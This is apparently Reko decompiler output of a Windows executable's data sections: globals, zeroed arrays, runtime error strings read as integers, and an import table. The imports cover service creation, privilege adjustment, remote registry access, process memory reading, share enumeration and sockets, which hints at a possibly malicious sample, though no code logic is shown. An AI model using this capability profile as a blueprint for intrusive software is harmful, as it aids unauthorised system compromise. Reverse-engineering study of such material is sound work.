// subject_data_0000.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

word32 g_dw40F000 = 0x00; // 0040F000
word32 g_dw40F004 = 0x00; // 0040F004
word32 g_dw40F008 = 0x00; // 0040F008
word32 g_dw40F014 = 0x00; // 0040F014
word32 g_dw40F018 = 0x00; // 0040F018
word32 g_dw40F020 = 0x00; // 0040F020
word32 g_dw40F024 = 0x00; // 0040F024
word32 g_dw40F028 = 0x00; // 0040F028
Eq_835 g_t40F0D0 = // 0040F0D0
	{
		0x07,
		0x92,
	};
byte g_b4100D4 = 0x92; // 004100D4
Eq_2 g_t412900 = // 00412900
	{
		&g_t0001
	};
<anonymous> * g_ptr412910 = &g_t40A24A; // 00412910
word32 g_dw412914 = 0x02; // 00412914
byte g_a412918[5] = // 00412918
	{
		0x01,
		0x02,
		0x04,
		0x08,
		0x00,
	};
Eq_10224 g_a412920[6] = // 00412920
	{
		
		{
			
			{
				&g_t03A4
			},
		},
		
		{
			
			{
				&g_t03A8
			},
		},
		
		{
			
			{
				&g_t03B5
			},
		},
		
		{
			
			{
				&g_t03B6
			},
		},
		
		{
			
			{
				&g_t0551
			},
		},
		
		{
			
			{
				&g_t412A1A
			},
		},
	};
Eq_10146 (* g_ptr412A10)[] = &g_a412A1A; // 00412A10
word16 g_a412A1A[] = // 00412A1A
	{
	};
int32 g_dw412C1C = 1; // 00412C1C
word32 g_dw412C40 = 0xC0000005; // 00412C40
int32 g_dw412CB8 = 3; // 00412CB8
word32 g_dw412CBC = 0x07; // 00412CBC
ui32 g_dw412CC0 = 0x0A; // 00412CC0
word32 g_dw412CC4 = 0x8C; // 00412CC4
Eq_10292 g_a412CE8[19] = // 00412CE8
	{
		
		{
			0x02,
			
			{
				&g_t40D548
			},
		},
		
		{
			0x08,
			
			{
				&g_t40D51C
			},
		},
		
		{
			0x09,
			
			{
				&g_t40D4F0
			},
		},
		
		{
			0x0A,
			
			{
				&g_t40D4CC
			},
		},
		
		{
			0x10,
			
			{
				&g_t40D4A0
			},
		},
		
		{
			0x11,
			
			{
				&g_t40D470
			},
		},
		
		{
			0x12,
			
			{
				&g_t40D44C
			},
		},
		
		{
			0x13,
			
			{
				&g_t40D420
			},
		},
		
		{
			0x18,
			
			{
				&g_t40D3E8
			},
		},
		
		{
			0x19,
			
			{
				&g_t40D3C0
			},
		},
		
		{
			0x1A,
			
			{
				&g_t40D388
			},
		},
		
		{
			0x1B,
			
			{
				&g_t40D350
			},
		},
		
		{
			0x1C,
			
			{
				&g_t40D328
			},
		},
		
		{
			0x78,
			
			{
				&g_t40D318
			},
		},
		
		{
			121,
			
			{
				&g_t40D308
			},
		},
		
		{
			122,
			
			{
				&g_t40D2F8
			},
		},
		
		{
			252,
			
			{
				&g_t40D2F4
			},
		},
		
		{
			0xFF,
			
			{
				&g_t40D2E4
			},
		},
		
		{
			0x00,
			
			{
				null
			},
		},
	};
word32 g_dw412D78 = 0x00; // 00412D78
Eq_2 g_t413020 = // 00413020
	{
		&g_t03F8
	};
word32 g_dw4131CC = 0x00; // 004131CC
// subject_data_0008.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

Eq_2 g_t4933D8 = // 004933D8
	{
		null
	};
Eq_2 g_t4938F0 = // 004938F0
	{
		null
	};
word32 g_dw4938F4 = 0x00; // 004938F4
Eq_2 g_t4938F8 = // 004938F8
	{
		null
	};
Eq_2629 g_t493900 = 0x00; // 00493900
Eq_2 g_t493904 = // 00493904
	{
		null
	};
Eq_2 g_t493908 = // 00493908
	{
		null
	};
Eq_2 g_t49390C = // 0049390C
	{
		null
	};
Eq_2 g_t493910 = // 00493910
	{
		null
	};
Eq_2 g_t493914 = // 00493914
	{
		null
	};
Eq_2 g_t493920 = // 00493920
	{
		null
	};
word32 g_dw493928 = 0x00; // 00493928
word32 g_dw49392C = 0x00; // 0049392C
word32 g_dw493930 = 0x00; // 00493930
Eq_2 g_t49393C = // 0049393C
	{
		null
	};
Eq_2 g_t49394C = // 0049394C
	{
		null
	};
uint32 g_dw493960 = 0x00; // 00493960
uint32 g_dw493964 = 0x00; // 00493964
ui32 g_dw493968 = 0x00; // 00493968
uint32 g_dw49396C = 0x00; // 0049396C
word32 g_dw493970 = 0x00; // 00493970
Eq_2 g_t493974 = // 00493974
	{
		null
	};
Eq_2 g_t49397C = // 0049397C
	{
		null
	};
word32 g_dw49398C = 0x00; // 0049398C
byte g_b493994 = 0x00; // 00493994
word32 g_dw493998 = 0x00; // 00493998
word32 g_dw49399C = 0x00; // 0049399C
struct _EXCEPTION_POINTERS * g_ptr4939A0 = null; // 004939A0
word32 g_dw493AA8 = 0x00; // 00493AA8
<anonymous> * g_ptr493AAC = null; // 00493AAC
word32 g_dw493AB0 = 0x00; // 00493AB0
word32 g_dw493AB8 = 0x00; // 00493AB8
<anonymous> * g_ptr493ABC = null; // 00493ABC
Eq_2 g_t493AC0 = // 00493AC0
	{
		null
	};
Eq_2 g_t493AC4 = // 00493AC4
	{
		null
	};
Eq_2 g_t493AC8 = // 00493AC8
	{
		null
	};
ui32 g_dw493ACC = 0x00; // 00493ACC
Eq_8358 g_t493AD0 = // 00493AD0
	{
		0
	};
Eq_2 g_t493AD4 = // 00493AD4
	{
		null
	};
Eq_2 g_t493AD8 = // 00493AD8
	{
		null
	};
ui32 g_dw493ADC = 0x00; // 00493ADC
Eq_2 g_t493AE0 = // 00493AE0
	{
		null
	};
Eq_2 g_t494B04 = // 00494B04
	{
		null
	};
Eq_2 g_t494B20 = // 00494B20
	{
		null
	};
Eq_2 g_a494B24[] = // 00494B24
	{
	};
Eq_2 g_t494C20 = // 00494C20
	{
		null
	};
word32 g_dw494C24 = 0x00; // 00494C24
word32 g_dw494C28 = 0x00; // 00494C28
up32 g_dw494C2C = 0x00; // 00494C2C
word32 * g_ptr494C30 = null; // 00494C30
<anonymous> * g_ptr494C34 = null; // 00494C34
Eq_2 g_t494C38 = // 00494C38
	{
		null
	};
word32 g_dw494C40 = 0x00; // 00494C40
word32 g_dw494C44 = 0x00; // 00494C44
word32 g_dw494C48 = 0x00; // 00494C48
word32 g_dw494C4C = 0x00; // 00494C4C
byte g_a494C60[257] = // 00494C60
	{
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
	};
Eq_5233 g_a494D60[] = // 00494D60
	{
	};
byte g_a494D61[257] = // 00494D61
	{
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
	};
byte g_a494D62[255] = // 00494D62
	{
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
		0x00,
	};
Eq_2 g_t494E64 = // 00494E64
	{
		null
	};
Eq_2 g_t494E68 = // 00494E68
	{
		null
	};
// subject_rdata.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

<anonymous> * __imp__OpenSCManagerA = &g_tDC96; // 0040D000
<anonymous> * __imp__StartServiceCtrlDispatcherA = &g_tDCA8; // 0040D004
<anonymous> * __imp__LookupPrivilegeValueA = &g_tDDD8; // 0040D008
<anonymous> * __imp__AdjustTokenPrivileges = &g_tDDC0; // 0040D00C
<anonymous> * __imp__RegSetValueExA = &g_tDD9E; // 0040D010
<anonymous> * __imp__RegQueryValueExA = &g_tDD8A; // 0040D014
<anonymous> * __imp__RegCreateKeyA = &g_tDDB0; // 0040D018
<anonymous> * __imp__RegConnectRegistryA = &g_tDD64; // 0040D01C
<anonymous> * __imp__OpenProcessToken = &g_tDD50; // 0040D020
<anonymous> * __imp__StartServiceA = &g_tDD7A; // 0040D024
<anonymous> * __imp__AllocateAndInitializeSid = &g_tDD1E; // 0040D028
<anonymous> * __imp__EqualSid = &g_tDD12; // 0040D02C
<anonymous> * __imp__GetTokenInformation = &g_tDD3A; // 0040D030
<anonymous> * __imp__RegisterServiceCtrlHandlerA = &g_tDCEA; // 0040D034
<anonymous> * __imp__OpenServiceA = &g_tDCDA; // 0040D038
<anonymous> * __imp__FreeSid = &g_tDD08; // 0040D03C
<anonymous> * __imp__CloseServiceHandle = &g_tDC6E; // 0040D040
<anonymous> * __imp__RegEnumValueA = &g_tDC5E; // 0040D044
<anonymous> * __imp__CreateServiceA = &g_tDC84; // 0040D048
<anonymous> * __imp__RegOpenKeyA = &g_tDC3E; // 0040D04C
<anonymous> * __imp__RegEnumKeyA = &g_tDC30; // 0040D050
<anonymous> * __imp__RegDeleteValueA = &g_tDC4C; // 0040D054
<anonymous> * __imp__SetServiceStatus = &g_tDCC6; // 0040D058
<anonymous> * __imp__RegCloseKey = &g_tDC22; // 0040D05C
<anonymous> * __imp__GetComputerNameA = &g_tDA20; // 0040D064
<anonymous> * __imp__IsDBCSLeadByte = &g_tDA40; // 0040D068
<anonymous> * __imp__WriteFile = &g_tDA52; // 0040D06C
<anonymous> * __imp__ReadFile = &g_tDA5E; // 0040D070
<anonymous> * __imp__GetTempFileNameA = &g_tDA6A; // 0040D074
<anonymous> * __imp__MultiByteToWideChar = &g_tDA0A; // 0040D078
<anonymous> * __imp__CopyFileA = &g_tDA34; // 0040D07C
<anonymous> * __imp__SetFileAttributesA = &g_tDA9C; // 0040D080
<anonymous> * __imp__FindClose = &g_tDAB2; // 0040D084
<anonymous> * __imp__FindNextFileA = &g_tDABE; // 0040D088
<anonymous> * __imp__FindFirstFileA = &g_tDACE; // 0040D08C
<anonymous> * __imp__SetEndOfFile = &g_tDAE0; // 0040D090
<anonymous> * __imp__LocalAlloc = &g_tD9D0; // 0040D094
<anonymous> * __imp__GetTempPathA = &g_tDA7E; // 0040D098
<anonymous> * __imp__DeleteFileA = &g_tDA8E; // 0040D09C
<anonymous> * __imp__WideCharToMultiByte = &g_tD9F4; // 0040D0A0
<anonymous> * __imp__CreateProcessA = &g_tDB2E; // 0040D0A4
<anonymous> * __imp__GetSystemDirectoryA = &g_tDB40; // 0040D0A8
<anonymous> * __imp__GetCurrentProcess = &g_tDB56; // 0040D0AC
<anonymous> * __imp__SystemTimeToFileTime = &g_tDB6A; // 0040D0B0
<anonymous> * __imp__GetSystemTime = &g_tDB82; // 0040D0B4
<anonymous> * __imp__GetVersionExA = &g_tDB92; // 0040D0B8
<anonymous> * __imp__GetVersion = &g_tDBA2; // 0040D0BC
<anonymous> * __imp__WaitForSingleObject = &g_tDBB0; // 0040D0C0
<anonymous> * __imp__GetCommandLineA = &g_tDBC6; // 0040D0C4
<anonymous> * __imp__ExpandEnvironmentStringsA = &g_tDBD8; // 0040D0C8
<anonymous> * __imp__GetDriveTypeA = &g_tDBF4; // 0040D0CC
<anonymous> * __imp__CreateThread = &g_tDC04; // 0040D0D0
<anonymous> * __imp__GetCurrentProcessId = &g_tD9DE; // 0040D0D4
<anonymous> * __imp__GetLocalTime = &g_tD9A4; // 0040D0D8
<anonymous> * __imp__LocalFree = &g_tD9C4; // 0040D0DC
<anonymous> * __imp__GetLastError = &g_tD9B4; // 0040D0E0
<anonymous> * __imp__SetFilePointer = &g_tDAF0; // 0040D0E4
<anonymous> * __imp__GetFileTime = &g_tDB02; // 0040D0E8
<anonymous> * __imp__GetFileSize = &g_tD976; // 0040D0EC
<anonymous> * __imp__FreeLibrary = &g_tD870; // 0040D0F0
<anonymous> * __imp__LoadLibraryA = &g_tD890; // 0040D0F4
<anonymous> * __imp__UnmapViewOfFile = &g_tD992; // 0040D0F8
<anonymous> * __imp__CreateFileA = &g_tD984; // 0040D0FC
<anonymous> * __imp__Process32First = &g_tD93E; // 0040D100
<anonymous> * __imp__CreateFileMappingA = &g_tD960; // 0040D104
<anonymous> * __imp__MapViewOfFile = &g_tD950; // 0040D108
<anonymous> * __imp__CreateToolhelp32Snapshot = &g_tD8FC; // 0040D10C
<anonymous> * __imp__Process32Next = &g_tD92E; // 0040D110
<anonymous> * __imp__GetModuleFileNameA = &g_tD918; // 0040D114
<anonymous> * __imp__ReadProcessMemory = &g_tD8CA; // 0040D118
<anonymous> * __imp__Module32First = &g_tD8EC; // 0040D11C
<anonymous> * __imp__OpenProcess = &g_tD8DE; // 0040D120
<anonymous> * __imp__CloseHandle = &g_tD8A0; // 0040D124
<anonymous> * __imp__TerminateProcess = &g_tD8B6; // 0040D128
<anonymous> * __imp__Sleep = &g_tD8AE; // 0040D12C
<anonymous> * __imp__SetFileTime = &g_tDB10; // 0040D130
<anonymous> * __imp__GetTickCount = &g_tDB1E; // 0040D134
<anonymous> * __imp__GetProcAddress = &g_tD87E; // 0040D138
<anonymous> * __imp__LCMapStringW = &g_tDEAC; // 0040D13C
<anonymous> * __imp__LCMapStringA = &g_tDE9C; // 0040D140
<anonymous> * __imp__FlushFileBuffers = &g_tE00E; // 0040D144
<anonymous> * __imp__SetStdHandle = &g_tDFFE; // 0040D148
<anonymous> * __imp__HeapReAlloc = &g_tDFF0; // 0040D14C
<anonymous> * __imp__VirtualAlloc = &g_tDFE0; // 0040D150
<anonymous> * __imp__GetStringTypeW = &g_tDFCE; // 0040D154
<anonymous> * __imp__GetStringTypeA = &g_tDFBC; // 0040D158
<anonymous> * __imp__RtlUnwind = &g_tDFB0; // 0040D15C
<anonymous> * __imp__VirtualFree = &g_tDFA2; // 0040D160
<anonymous> * __imp__HeapCreate = &g_tDF94; // 0040D164
<anonymous> * __imp__HeapDestroy = &g_tDF86; // 0040D168
<anonymous> * __imp__GetFileType = &g_tDF78; // 0040D16C
<anonymous> * __imp__GetStdHandle = &g_tDF68; // 0040D170
<anonymous> * __imp__GetModuleHandleA = &g_tDE46; // 0040D174
<anonymous> * __imp__GetStartupInfoA = &g_tDE5A; // 0040D178
<anonymous> * __imp__ExitProcess = &g_tDE6C; // 0040D17C
<anonymous> * __imp__GetCPInfo = &g_tDE7A; // 0040D180
<anonymous> * __imp__GetACP = &g_tDE86; // 0040D184
<anonymous> * __imp__GetOEMCP = &g_tDE90; // 0040D188
<anonymous> * __imp__SetHandleCount = &g_tDF56; // 0040D18C
<anonymous> * __imp__HeapFree = &g_tDEBC; // 0040D190
<anonymous> * __imp__HeapAlloc = &g_tDEC8; // 0040D194
<anonymous> * __imp__UnhandledExceptionFilter = &g_tDED4; // 0040D198
<anonymous> * __imp__FreeEnvironmentStringsA = &g_tDEF0; // 0040D19C
<anonymous> * __imp__FreeEnvironmentStringsW = &g_tDF0A; // 0040D1A0
<anonymous> * __imp__GetEnvironmentStrings = &g_tDF24; // 0040D1A4
<anonymous> * __imp__GetEnvironmentStringsW = &g_tDF3C; // 0040D1A8
<anonymous> * __imp__WNetOpenEnumA = &g_tDE2E; // 0040D1B0
<anonymous> * __imp__WNetEnumResourceA = &g_tDE1A; // 0040D1B4
<anonymous> * __imp__WNetCloseEnum = &g_tDE0A; // 0040D1B8
<anonymous> * __imp__WS2_32.dll_52 = &g_t80000034; // 0040D1C0
<anonymous> * __imp__WS2_32.dll_3 = &g_t80000003; // 0040D1C4
<anonymous> * __imp__WS2_32.dll_116 = &g_t80000074; // 0040D1C8
<anonymous> * __imp__WS2_32.dll_16 = &g_t80000010; // 0040D1CC
<anonymous> * __imp__WS2_32.dll_19 = &g_t80000013; // 0040D1D0
<anonymous> * __imp__WS2_32.dll_9 = &g_t80000009; // 0040D1D4
<anonymous> * __imp__WS2_32.dll_4 = &g_t80000004; // 0040D1D8
<anonymous> * __imp__WS2_32.dll_111 = &g_t8000006F; // 0040D1DC
<anonymous> * __imp__WS2_32.dll_115 = &g_t80000073; // 0040D1E0
<anonymous> * __imp__WS2_32.dll_23 = &g_t80000017; // 0040D1E4
Eq_10346 g_t40D2E4 = // 0040D2E4
	{
		0x6C756E28,
		10604,
		0x746E7572,
		0x20656D69,
		0x534F4C54,
		0x00,
		
		{
		},
		
		{
		},
		0x00,
		0x00,
		0x00,
	};
Eq_10346 g_t40D2F4 = // 0040D2F4
	{
		0x6F727265,
		0x2072,
		0x0A0D,
		0x534F4C54,
		1196312915,
		0x20,
		
		{
		},
		
		{
		},
		0x00,
		0x00,
		0x00,
	};
Eq_10346 g_t40D2F8 = // 0040D2F8
	{
		0x2072,
		0x0A0D,
		0x534F4C54,
		0x72652053,
		0x72726520,
		0x69,
		
		{
		},
		
		{
		},
		0x00,
		0x00,
		0x00,
	};
Eq_10346 g_t40D308 = // 0040D308
	{
		225603442,
		0x0A,
		1196312915,
		0x72726520,
		1696616009,
		0x0A,
		
		{
		},
		
		{
		},
		0x00,
		0x00,
		0x00,
	};
Eq_10346 g_t40D318 = // 0040D318
	{
		0x0A0D726F,
		0x00,
		0x414D4F44,
		1696616009,
		755633464,
		116,
		
		{
		},
		
		{
		},
		0x00,
		0x00,
		0x00,
	};
Eq_10346 g_t40D328 = // 0040D328
	{
		0x726F7272,
		0x0A0D,
		0x32303652,
		755633464,
		0x6974696E,
		111,
		
		{
		},
		
		{
		},
		0x00,
		0x00,
		0x00,
	};
Eq_10346 g_t40D350 = // 0040D350
	{
		0x0A0D7061,
		0x00,
		0x32303652,
		755633463,
		1667330163,
		116,
		
		{
		},
		
		{
		},
		0x00,
		0x00,
		0x00,
	};
Eq_10346 g_t40D388 = // 0040D388
	{
		0x0A0D6E6F,
		0x00,
		0x32303652,
		0x2D0A0D36,
		1667330163,
		114,
		
		{
		},
		
		{
		},
		0x00,
		0x00,
		0x00,
	};
Eq_10346 g_t40D3C0 = // 0040D3C0
	{
		0x0A0D6E6F,
		0x00,
		0x32303652,
		0x2D0A0D35,
		0x7566206C,
		111,
		
		{
		},
		
		{
		},
		0x00,
		0x00,
		0x00,
	};
Eq_10346 g_t40D3E8 = // 0040D3E8
	{
		0x0D6C6C61,
		0x0A,
		0x32303652,
		0x2D0A0D34,
		1667330163,
		0x61,
		
		{
		},
		
		{
		},
		0x00,
		0x00,
		0x00,
	};
Eq_10346 g_t40D420 = // 0040D420
	{
		0x0A0D656C,
		0x00,
		0x31303652,
		755633465,
		544105840,
		0x70,
		
		{
		},
		
		{
		},
		0x00,
		0x00,
		0x00,
	};
Eq_10346 g_t40D44C = // 0040D44C
	{
		0x0A0D6563,
		0x00,
		0x31303652,
		755633464,
		1885431144,
		0x20,
		
		{
		},
		
		{
		},
		0x00,
		0x00,
		0x00,
	};
Eq_10346 g_t40D470 = // 0040D470
	{
		0x0A0D726F,
		0x00,
		0x31303652,
		755633463,
		1953265005,
		0x20,
		
		{
		},
		
		{
		},
		0x00,
		0x00,
		0x00,
	};
Eq_10346 g_t40D4A0 = // 0040D4A0
	{
		0x0A0D726F,
		0x00,
		0x31303652,
		0x2D0A0D36,
		1667330163,
		0x69,
		
		{
		},
		
		{
		},
		0x00,
		0x00,
		0x00,
	};
Eq_10346 g_t40D4CC = // 0040D4CC
	{
		0x74616420,
		658785,
		0x62610A0D,
		0x6D726F6E,
		0x696D7265,
		110,
		
		{
		},
		
		{
		},
		0x00,
		0x00,
		0x00,
	};
Eq_10346 g_t40D4F0 = // 0040D4F0
	{
		0x0A0D6E6F,
		0x00,
		0x30303652,
		755633465,
		1667330163,
		99,
		
		{
		},
		
		{
		},
		0x00,
		0x00,
		0x00,
	};
Eq_10346 g_t40D51C = // 0040D51C
	{
		0x6E656D6E,
		0x000A0D74,
		0x30303652,
		755633464,
		1667330163,
		0x20,
		
		{
		},
		
		{
		},
		0x00,
		0x00,
		0x00,
	};
Eq_10346 g_t40D548 = // 0040D548
	{
		225670254,
		0x0A,
		0x30303652,
		0x2D0A0D32,
		544501353,
		101,
		
		{
		},
		
		{
		},
		0x00,
		0x00,
		0x00,
	};
word32 g_dw40D684 = 0xDC96; // 0040D684
word32 g_dw40D688 = 56488; // 0040D688
word32 g_dw40D68C = 0xDDD8; // 0040D68C
word32 g_dw40D690 = 0xDDC0; // 0040D690
word32 g_dw40D694 = 0xDD9E; // 0040D694
word32 g_dw40D698 = 0xDD8A; // 0040D698
word32 g_dw40D69C = 0xDDB0; // 0040D69C
word32 g_dw40D6A0 = 56676; // 0040D6A0
word32 g_dw40D6A4 = 56656; // 0040D6A4
word32 g_dw40D6A8 = 0xDD7A; // 0040D6A8
word32 g_dw40D6AC = 56606; // 0040D6AC
word32 g_dw40D6B0 = 0xDD12; // 0040D6B0
word32 g_dw40D6B4 = 0xDD3A; // 0040D6B4
word32 g_dw40D6B8 = 56554; // 0040D6B8
word32 g_dw40D6BC = 0xDCDA; // 0040D6BC
word32 g_dw40D6C0 = 0xDD08; // 0040D6C0
word32 g_dw40D6C4 = 0xDC6E; // 0040D6C4
word32 g_dw40D6C8 = 56414; // 0040D6C8
word32 g_dw40D6CC = 56452; // 0040D6CC
word32 g_dw40D6D0 = 0xDC3E; // 0040D6D0
word32 g_dw40D6D4 = 0xDC30; // 0040D6D4
word32 g_dw40D6D8 = 0xDC4C; // 0040D6D8
word32 g_dw40D6DC = 0xDCC6; // 0040D6DC
word32 g_dw40D6E0 = 0xDC22; // 0040D6E0
word32 g_dw40D6E8 = 0xDA20; // 0040D6E8
